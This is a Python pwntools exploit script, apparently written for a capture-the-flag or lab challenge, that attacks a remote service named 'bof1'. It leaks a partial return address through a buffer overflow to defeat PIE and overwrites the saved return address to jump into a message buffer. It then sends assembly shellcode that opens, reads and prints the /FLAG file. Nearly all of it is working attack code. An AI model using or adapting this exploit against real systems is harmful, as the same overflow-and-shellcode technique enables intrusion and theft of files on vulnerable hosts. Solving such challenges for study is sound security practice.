from pwn import *

# 設定目標架構
context.arch = 'amd64'
context.log_level = 'debug'
elf = ELF('./bof1')
offset_main_start = elf.symbols['main']
offset_task_ret_point_in_main = offset_main_start + 0xc6
offset_msg = elf.symbols['msg']

log.info(f"Static offset_ret (main+0xc6): {hex(offset_task_ret_point_in_main)}")

# p = process('./bof1')
p = remote('up.zoolab.org', 12342)

payload_leak_ra = b'A' * 56
p.sendafter(b"What's your name? ", payload_leak_ra)
p.recvuntil(b"Welcome, ", timeout=3)

leaked_output_after_welcome = p.recvline(keepends=False, timeout=1)
if not leaked_output_after_welcome:
    temp_buffer = b''
    for _ in range(8): # Try to read up to 8 bytes
        try:
            byte = p.recv(1, timeout=0.1)
            if not byte: break
            temp_buffer += byte
        except PwnlibException: break
    if not temp_buffer: # If still nothing, assume a very short fixed leak
        log.warning("recvline and byte-by-byte failed, trying to recv fixed short amount")
        # This case might happen if server sends e.g. exactly 58 bytes then pauses
        # and 58 bytes is payload_leak_ra + 2 bytes of RA, with no newline
        leaked_output_after_welcome = payload_leak_ra + p.recv(2,timeout=0.5) # Example: try for 2 bytes of RA
    else:
        leaked_output_after_welcome = payload_leak_ra + temp_buffer
log.debug(f"Received line/bytes for RA leak: {leaked_output_after_welcome!r}")

if not leaked_output_after_welcome.startswith(payload_leak_ra):
    log.error("RA leak: Malformed leak (doesn't start with As)."); p.close(); exit()

leaked_ra_partial_bytes = leaked_output_after_welcome[len(payload_leak_ra):]
num_leaked_ra_bytes = len(leaked_ra_partial_bytes)
log.info(f"RA leak: Extracted partial RA bytes: {leaked_ra_partial_bytes!r} (len: {num_leaked_ra_bytes})")

if num_leaked_ra_bytes == 0:
    log.error("RA leak: No RA bytes leaked."); p.close(); exit()

# Assume printf stopped because the (num_leaked_ra_bytes+1)-th byte of RA was a terminator (e.g. \x00).
# So, the higher bytes of the 8-byte RA are effectively zero for the purpose of this leak.
leaked_ra_bytes_padded = leaked_ra_partial_bytes.ljust(8, b'\x00')
leaked_ra_addr = u64(leaked_ra_bytes_padded)
log.info(f"RA leak: Constructed full RA (padded): {hex(leaked_ra_addr)}")

pie_base = leaked_ra_addr - offset_task_ret_point_in_main
log.success(f"RA leak: Calculated PIE base: {hex(pie_base)}")

# Crucial PIE base validity checks
if (pie_base & 0xfff) != 0:
    log.error(f"Calculated PIE base {hex(pie_base)} is NOT page aligned. Exploit will likely fail. EXITING.")
    p.close(); exit()
# Check if PIE base is in a somewhat expected user-space range (very broad check)
# Static PIE can be loaded quite high due to ASLR, even into 0x7f... if that's where kernel chooses.
# Or lower like 0x55..., 0x56...
# A negative or very small positive PIE base is definitely wrong.
if pie_base < 0x10000: # Minimum plausible base address (e.g. 64KB)
    log.error(f"Calculated PIE base {hex(pie_base)} is too small or negative. Exploit likely failed. EXITING.")
    p.close(); exit()
log.info(f"Calculated PIE base {hex(pie_base)} passed basic checks.")


msg_runtime_addr = pie_base + offset_msg
log.success(f"RA leak: Calculated msg runtime address: {hex(msg_runtime_addr)}")

# ... rest of the exploit ...
payload_skip_buf2 = b"skip_me"
p.sendlineafter(b"What's the room number? ", payload_skip_buf2)
p.recvuntil(b"The room number is: ", timeout=2); p.recvline(timeout=1) # Consume output

offset_buf3_to_sfp = 144
fake_rbp = 0xdeadbeefcafebabe
payload_overwrite_ra = b'B' * offset_buf3_to_sfp + p64(fake_rbp) + p64(msg_runtime_addr)
p.sendlineafter(b"What's the customer's name? ", payload_overwrite_ra)
p.recvuntil(b"The customer's name is: ", timeout=2); p.recvline(timeout=1) # Consume output

shellcode_str = """
    lea rdi, [rip+flag_path_str]
    xor rsi, rsi
    xor rdx, rdx
    mov rax, 2
    syscall

    mov rdi, rax
    lea rsi, [rip+file_buffer]
    mov rdx, 100
    mov rax, 0
    syscall

    mov rdx, rax
    mov rdi, 1
    lea rsi, [rip+file_buffer]
    mov rax, 1
    syscall

    xor rdi, rdi
    mov rax, 60
    syscall

flag_path_str:
    .asciz "/FLAG"
file_buffer:
    .fill 128, 1, 0
"""
shellcode = asm(shellcode_str)
p.sendafter(b"Leave your message: ", shellcode)
p.recvuntil(b"Thank you!\n", timeout=2)

log.info("Shellcode should be executing. Attempting to receive the flag...")
flag_content = p.recvall(timeout=3)
if flag_content:
    log.success(f"FLAG: {flag_content.decode(errors='ignore').strip()}")
else:
    log.warning("No flag content received. Shellcode might have failed or not printed anything.")
p.close()